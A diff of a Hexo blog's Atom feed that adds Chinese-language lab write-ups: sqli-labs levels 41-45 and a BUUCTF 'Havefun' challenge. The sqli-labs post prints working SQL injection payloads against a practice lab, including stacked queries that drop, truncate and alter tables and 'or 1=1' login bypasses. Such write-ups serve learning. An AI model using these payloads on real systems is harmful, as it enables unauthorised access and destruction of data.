@@ -6,7 +6,7 @@
   <link href="https://chenzhengkai10.github.io/atom.xml" rel="self"/>
   
   <link href="https://chenzhengkai10.github.io/"/>
-  <updated>2024-10-14T10:33:01.517Z</updated>
+  <updated>2024-06-07T18:24:52.000Z</updated>
   <id>https://chenzhengkai10.github.io/</id>
   
   <author>
@@ -15,37 +15,6 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>testBlog</title>
-    <link href="https://chenzhengkai10.github.io/2024/10/14/testBlog/"/>
-    <id>https://chenzhengkai10.github.io/2024/10/14/testBlog/</id>
-    <published>2024-10-14T10:33:01.000Z</published>
-    <updated>2024-10-14T10:33:01.517Z</updated>
-    
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="https://chenzhengkai10.github.io/2024/10/14/hello-world/"/>
-    <id>https://chenzhengkai10.github.io/2024/10/14/hello-world/</id>
-    <published>2024-10-14T10:27:36.447Z</published>
-    <updated>2022-09-20T14:44:22.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start">#</a> Quick Start</h2> <span id="more"></span><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post">#</a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server">#</a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files">#</a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites">#</a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
-&lt;h2 id=&quot;quick-start&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#quick-start&quot;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;</summary>
-    
-    
-    
-    
-  </entry>
   
   <entry>
     <title>Vulnstack红日靶场</title>
@@ -434,6 +403,48 @@
     
     
     <category term="sqli-labs" scheme="https://chenzhengkai10.github.io/tags/sqli-labs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqli-labs-41-45</title>
+    <link href="https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/"/>
+    <id>https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/</id>
+    <published>2023-03-29T08:15:31.000Z</published>
+    <updated>2023-03-31T09:46:24.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="sqli-labs-41-45"><a class="markdownIt-Anchor" href="#sqli-labs-41-45">#</a> sqli-labs-41-45</h1><span id="more"></span><h2 id="sqli-labs-41"><a class="markdownIt-Anchor" href="#sqli-labs-41">#</a> sqli-labs-41</h2><p>id=1有查询结果</p><p>id=1’无查询结果</p><p>id=1&quot;无查询结果</p><p>id=1 --+有查询结果</p><p>本关无闭合</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113611.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113611.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看源代码确实无闭合</p><p>直接进行堆叠注入</p><p>在 oblivion10 数据库下新建一个 test 表然后再删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1;use oblivion10;create table test(id int,user varchar(10)); --+</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113612.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113612.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功创建</p><p>尝试删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1;drop table oblivion10.test; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113613.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113613.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功删除表 test</p><h2 id="sqli-labs-42"><a class="markdownIt-Anchor" href="#sqli-labs-42">#</a> sqli-labs-42</h2><p>本关为 post 型</p><p>我们登录并且使用 bp 抓包</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113614.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113614.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>那我们可以通过这个来更改 user admin 的密码，不过登录成功后也可以直接更改我觉得没什么必要更改这个用户的密码了</p><p>所以尝试更改 security 中其他用户的密码</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113615.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113615.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试更改 user stupid 的密码</p><p>bp 抓包，尝试闭合，发现本关是单引号闭合</p><p>更改密码</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113616.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113616.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113617.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113617.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113618.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113618.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功</p><h2 id="sqli-labs-43"><a class="markdownIt-Anchor" href="#sqli-labs-43">#</a> sqli-labs-43</h2><p><em><strong>PHP mysqli_real_escape_string () 函数</strong></em></p><p>转义字符串中的特殊字符</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113619.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113619.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>通过代码知道本关 password 是一个很明显的注入点</p><p>直接用 hackbar 来做这一道题，不过不能直接 load url，要直接提交至目标表单，再 load url 后面添加 login.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php</span><br></pre></td></tr></table></figure><p>由于我没有重置数据库，我的 admin 用户的 password 为 qwe</p><p>添加单引号尝试闭合</p><p>在 post data 输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113620.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113620.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113621.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113621.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>显而易见闭合为’)</p><p>之后对数据库的各种操作就不说了</p><h2 id="sqli-labs-44"><a class="markdownIt-Anchor" href="#sqli-labs-44">#</a> sqli-labs-44</h2><p>post data</p><p>login_user=admin’&amp;login_password=qwe&amp;mysubmit=Login</p><p>login_user=admin&quot;&amp;login_password=qwe&amp;mysubmit=Login</p><p>login_user=admin&amp;login_password=qwe’&amp;mysubmit=Login</p><p>login_user=admin&amp;login_password=qwe&quot;&amp;mysubmit=Login</p><p>说明本关不报错</p><p>盲注找闭合的方法其实也很简单，像本关这样两个输入框的正确值都不知道的情况下，在普通找闭合的 payload 中闭合符号之后增加 **or 1=1#** 就行，如果返回的页面显示登录成功，说明闭合成功。</p><p>用 hackbar 向</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php</span><br></pre></td></tr></table></figure><p>发送如下 payload 检查 username 输入框是否有注入点</p><p>login_user=admin’ or 1=1#&amp;login_password=qwe&amp;mysubmit=Login</p><p>login_user=admin&quot; or 1=1#&amp;login_password=qwe&amp;mysubmit=Login</p><p>页面回显都是下图这样登录失败的页面，username 输入框没找到注入点<br><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113622.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113622.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>送如下 payload 检查 password 输入框是否有注入点</p><p>login_user=admin&amp;login_password=pass’ or 1=1#&amp;mysubmit=Login</p><p>成功</p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113623.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113623.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>剩下的就是堆叠注入了<br>这里来使用试下清空表中所有数据的 sql 语句</p><p>先在 oblivion10 数据库中新建几个数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(1,&#x27;tset2&#x27;)#&amp;mysubmit=Login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(2,&#x27;tset2&#x27;)#&amp;mysubmit=Login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(3,&#x27;tset3&#x27;)#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113624.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113624.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;;truncate table oblivion10.test66#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113625.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113625.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功删除</p><h2 id="sqli-labs-45"><a class="markdownIt-Anchor" href="#sqli-labs-45">#</a> sqli-labs-45</h2><p>用 44 关写到的方法</p><p>post data 输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;) or 1=1#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113626.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113626.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>本关尝试给 oblivion10 数据库中 test66 表新增一列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;);alter table oblivion10.test66 add column num int(10)#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113627.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113627.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113628.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113628.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>新增成功</p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;sqli-labs-41-45&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sqli-labs-41-45&quot;&gt;#&lt;/a&gt; sqli-labs-41-45&lt;/h1&gt;</summary>
+    
+    
+    
+    <category term="sqli-labs" scheme="https://chenzhengkai10.github.io/categories/sqli-labs/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://chenzhengkai10.github.io/tags/sqli-labs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>buuctf[极客大挑战2019]Havefun</title>
+    <link href="https://chenzhengkai10.github.io/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/"/>
+    <id>https://chenzhengkai10.github.io/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/</id>
+    <published>2023-03-28T13:16:28.000Z</published>
+    <updated>2023-03-28T15:11:32.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="buuctf极客大挑战2019havefun"><a class="markdownIt-Anchor" href="#buuctf极客大挑战2019havefun">#</a> buuctf [极客大挑战 2019] Havefun</h1><span id="more"></span><p>进入页面</p><p><img src="/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_213212.png" class="lazyload" data-srcset="/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_213212.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>无可用信息，查看源代码</p><p><img src="/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_213305.png" class="lazyload" data-srcset="/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_213305.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>在下方被注释掉的一行中</p><p>第 409 行说明这里使用 cat 变量接受参数</p><p>if 语句中将 cat 变量中的参数和’dog‘进行比较，如果相等会出现什么呢尝试一下</p><p><img src="/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_213912.png" class="lazyload" data-srcset="/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_213912.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功得到 flag</p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;buuctf极客大挑战2019havefun&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#buuctf极客大挑战2019havefun&quot;&gt;#&lt;/a&gt; buuctf [极客大挑战 2019] Havefun&lt;/h1&gt;</summary>
+    
+    
+    
+    <category term="buuctf" scheme="https://chenzhengkai10.github.io/categories/buuctf/"/>
+    
+    
+    <category term="buuctf" scheme="https://chenzhengkai10.github.io/tags/buuctf/"/>
     
   </entry>
   
